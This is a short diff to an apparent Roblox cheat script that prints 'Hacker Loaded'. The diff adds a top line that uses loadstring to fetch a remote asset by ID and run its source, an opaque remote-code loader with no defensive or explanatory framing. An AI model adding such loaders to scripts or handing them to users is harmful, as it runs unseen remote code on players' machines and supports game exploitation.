@@ -1,3 +1,5 @@
+loadstring(game:GetObjects("rbxassetid://5425999987")[1].Source)()
+
 local plr = game:service'Players'.LocalPlayer
 print('Local User is '..plr.Name)
 print('Hacker Loaded')
